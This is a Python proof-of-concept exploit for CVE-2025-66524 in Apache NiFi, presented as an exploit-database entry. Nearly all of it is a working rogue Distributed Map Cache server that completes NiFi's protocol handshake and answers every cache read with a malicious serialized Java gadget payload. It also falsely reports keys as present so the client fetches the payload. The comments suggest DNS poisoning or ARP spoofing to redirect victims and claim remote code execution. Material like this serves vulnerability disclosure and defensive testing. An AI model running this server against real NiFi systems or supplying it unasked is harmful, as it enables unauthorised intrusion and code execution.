#!/usr/bin/env python3
# Exploit Title: Apache NiFi < 2.7.0 - Rogue Cache Server Deserialization (Vector 2)
# Exploit Author: Exploit Intelligence Platform (EIP)
# Vendor Homepage: https://nifi.apache.org/
# Version: Apache NiFi 1.20.0 - 2.6.0
# Tested on: Apache NiFi 2.6.0 / JDK 21
# CVE: CVE-2025-66524
# Reference: https://exploit-intel.com
"""
PoC Vector 2 for CVE-2025-66524: Rogue NiFi Distributed Map Cache Server

Alternative attack vector: Instead of injecting payloads into a legitimate cache server,
this script implements a rogue NiFi Distributed Map Cache server that serves malicious
serialized Java objects for ALL GET requests.

Attack scenario:
  - Attacker sets up a rogue cache server (this script)
  - If the attacker can redirect NiFi's cache client traffic (DNS poisoning, ARP spoofing,
    man-in-the-middle) or modify NiFi's flow configuration (requires NiFi API access),
    NiFi connects to the rogue server instead of the legitimate one
  - Every GET request returns a malicious serialized payload
  - The GetAsanaObject processor deserializes the payload via GenericObjectSerDe.deserialize()
  - ObjectInputStream.readObject() triggers the gadget chain

Usage:
    python3 poc_vector2_rogue_server.py [listen_port] [payload_file]

This vector demonstrates that the vulnerability is exploitable from EITHER side of the
cache connection:
  Vector 1 (poc.py): Attacker injects into legitimate server → processor deserializes
  Vector 2 (this):   Attacker IS the server → processor deserializes
"""

import socket
import struct
import sys
import os
import threading
import time

DEFAULT_PORT = 14557  # Different port to not conflict with legitimate server
PAYLOAD_FILE = "urldns_payload.bin"


def read_utf(sock):
    """Read a Java-style writeUTF string (2-byte length prefix + UTF-8)."""
    len_bytes = sock.recv(2)
    if len(len_bytes) < 2:
        return None
    str_len = struct.unpack('>H', len_bytes)[0]
    data = b''
    while len(data) < str_len:
        chunk = sock.recv(str_len - len(data))
        if not chunk:
            return None
        data += chunk
    return data.decode('utf-8')


def read_bytes(sock):
    """Read a length-prefixed byte array (4-byte big-endian length + data)."""
    len_bytes = sock.recv(4)
    if len(len_bytes) < 4:
        return None
    data_len = struct.unpack('>I', len_bytes)[0]
    if data_len == 0:
        return b''
    data = b''
    while len(data) < data_len:
        chunk = sock.recv(data_len - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def handle_client(client_sock, addr, payload_bytes):
    """
    Handle a NiFi Distributed Map Cache client connection.

    Implements the NiFi cache protocol to serve malicious payloads:
    1. Handshake: Receive "NiFi" magic + version → respond with RESOURCE_OK
    2. Operations: Respond to GET with malicious payload, handle PUT/etc.
    """
    print(f"[+] Client connected: {addr}")

    try:
        # Step 1: Handshake
        magic = client_sock.recv(4)
        if magic != b'NiFi':
            print(f"[-] Invalid magic: {magic}")
            return

        version_bytes = client_sock.recv(4)
        version = struct.unpack('>I', version_bytes)[0]
        print(f"    Protocol version: {version}")

        # Respond with RESOURCE_OK
        client_sock.sendall(b'\x14')
        print(f"    Handshake OK (sent RESOURCE_OK)")

        # Step 2: Handle operations
        while True:
            op = read_utf(client_sock)
            if op is None:
                print(f"    Client disconnected")
                break

            print(f"    Operation: {op}")

            if op == "get":
                # Read key
                key_data = read_bytes(client_sock)
                if key_data:
                    print(f"    GET key ({len(key_data)} bytes): {key_data[:20].hex()}...")

                # ATTACK: Return malicious payload for ALL GET requests
                print(f"    [!] SERVING MALICIOUS PAYLOAD ({len(payload_bytes)} bytes)")
                client_sock.sendall(struct.pack('>I', len(payload_bytes)))
                client_sock.sendall(payload_bytes)

            elif op == "put":
                # Read key + value
                key_data = read_bytes(client_sock)
                value_data = read_bytes(client_sock)
                print(f"    PUT key ({len(key_data) if key_data else 0} bytes), "
                      f"value ({len(value_data) if value_data else 0} bytes)")
                # Respond success
                client_sock.sendall(b'\x01')

            elif op == "containsKey":
                key_data = read_bytes(client_sock)
                print(f"    CONTAINS key ({len(key_data) if key_data else 0} bytes)")
                # Always say we have it (to trigger GET)
                client_sock.sendall(b'\x01')

            elif op == "keySet":
                print(f"    KEYSET requested")
                # Return empty set
                client_sock.sendall(struct.pack('>I', 0))

            elif op == "close":
                print(f"    CLOSE")
                break

            elif op == "putIfAbsent":
                key_data = read_bytes(client_sock)
                value_data = read_bytes(client_sock)
                print(f"    PUTIFABSENT key ({len(key_data) if key_data else 0} bytes)")
                # Return false (not absent) so client does a GET next
                client_sock.sendall(b'\x00')

            elif op == "getAndPutIfAbsent":
                key_data = read_bytes(client_sock)
                value_data = read_bytes(client_sock)
                print(f"    GETANDPUTIFABSENT key ({len(key_data) if key_data else 0} bytes)")
                # Return our malicious payload
                print(f"    [!] SERVING MALICIOUS PAYLOAD ({len(payload_bytes)} bytes)")
                client_sock.sendall(struct.pack('>I', len(payload_bytes)))
                client_sock.sendall(payload_bytes)

            else:
                print(f"    Unknown operation: {op}")
                break

    except Exception as e:
        print(f"    Error handling client: {e}")
    finally:
        client_sock.close()
        print(f"[-] Client disconnected: {addr}")


def run_rogue_server(listen_port, payload_bytes):
    """Run the rogue NiFi Distributed Map Cache server."""
    print("=" * 70)
    print("CVE-2025-66524: Rogue NiFi Distributed Map Cache Server")
    print("=" * 70)
    print()
    print(f"  Listening on:    0.0.0.0:{listen_port}")
    print(f"  Payload type:    URLDNS gadget chain")
    print(f"  Payload size:    {len(payload_bytes)} bytes")
    print()
    print("  This rogue server will respond to any GET request with a malicious")
    print("  serialized Java object (URLDNS gadget). When NiFi's GetAsanaObject")
    print("  processor connects and calls recoverState(), the response is")
    print("  deserialized via GenericObjectSerDe.deserialize() → RCE.")
    print()
    print("  To test: reconfigure NiFi's MapCacheClientService to point to this server,")
    print("  or use network-level redirection (DNS poisoning, ARP spoofing).")
    print("=" * 70)
    print()

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(('0.0.0.0', listen_port))
    server_sock.listen(5)
    print(f"[*] Rogue cache server listening on 0.0.0.0:{listen_port}")
    print(f"[*] Waiting for NiFi cache client connections...")

    try:
        while True:
            client_sock, addr = server_sock.accept()
            thread = threading.Thread(target=handle_client, args=(client_sock, addr, payload_bytes))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down rogue server")
    finally:
        server_sock.close()


if __name__ == '__main__':
    listen_port = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_PORT
    payload_file = sys.argv[2] if len(sys.argv) > 2 else PAYLOAD_FILE

    # Load payload
    script_dir = os.path.dirname(os.path.abspath(__file__))
    payload_path = os.path.join(script_dir, payload_file)

    try:
        with open(payload_path, 'rb') as f:
            payload_bytes = f.read()
        print(f"[*] Loaded payload: {payload_path} ({len(payload_bytes)} bytes)")
    except FileNotFoundError:
        print(f"[-] Payload file not found: {payload_path}")
        print(f"    Generate it with: java PayloadGenerator urldns <hostname> {payload_file}")
        sys.exit(1)

    run_rogue_server(listen_port, payload_bytes)
